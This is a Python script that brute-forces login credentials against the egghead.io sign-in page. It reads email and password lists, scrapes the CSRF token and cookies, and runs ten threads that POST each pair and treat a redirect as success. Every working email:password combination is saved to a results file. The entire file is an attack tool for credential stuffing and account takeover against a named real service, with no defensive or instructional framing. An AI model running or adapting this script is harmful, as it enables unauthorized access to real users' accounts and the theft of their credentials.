import requests as http
import os, threading, time
from re import findall

goodAcc = 0
badAcc = 0
result = open("result.txt", "a+")
emails = open('emails.txt', 'r').read().splitlines()
passwords = open('passwords.txt', 'r').read().splitlines()
threads = []
threadId = 0
emailIndex = -1

def cls():
    os.system('clear')

def banner():
    global goodAcc, badAcc, emails, passwords, emailIndex
    cls()
    print(" ##########################################")
    print(" #")
    print(" #   Emails count: "+ str(len(emails)))
    print(" #   Passwords count: "+ str(len(passwords)))
    print(" #")
    print(" #   Good: "+ str(goodAcc))
    print(" #   Bad: "+ str(badAcc))
    print(" #   Threads: "+ str(threadId))
    print(" #   EmailIndex: "+ str(emailIndex))
    print(" #")
    print(" ##########################################")

# Get CSRF-Token
def getSecurityData():
    response = http.get('https://egghead.io/users/sign_in')
    result = findall(r'csrf-token" content="(.+?)"', response.content)
    cookies = response.cookies
    token = result[0]
    return token, cookies

# Get token and cookies
token, cookies = getSecurityData();

def checkAccount(email, password):
    global result
    response = http.post(
        'https://egghead.io/users/sign_in',
        data={
            'authenticity_token': token,
            'user[email]': email,
            'user[password]': password
        }, 
        cookies=cookies,
        allow_redirects=False,
    )
    return response.status_code == 302

class ThreadBrute(threading.Thread):
    def __init__(self, threadId, emails, passwords):
        threading.Thread.__init__(self)
        self.threadId = threadId
    def run(self):
        global goodAcc, badAcc, emailIndex, emails, passwords, threadId, result

        while (len(emails) > emailIndex):
            emailIndex += 1
            try:
                email = emails[emailIndex]
                
                for password in passwords:
                    isValid = False

                    isValid = checkAccount(email, password)

                    if isValid:
                        goodAcc += 1
                        result.write(email + ":" + password + "\n")
                    else:
                        badAcc += 1

                    banner()
                    time.sleep(0.8);
            except:
                threadId -= 1

def startBrute():
    global threadId, result

    for i in range(10):
        threadId += 1
        thread = ThreadBrute(threadId, emails, passwords)
        thread.setDaemon(1)
        thread.start()
        threads.append(thread)
        banner()

    for t in threads:
        t.join()
        banner()

    result.close() 

    print("Finish!")

print "Brutforce started!"
startBrute()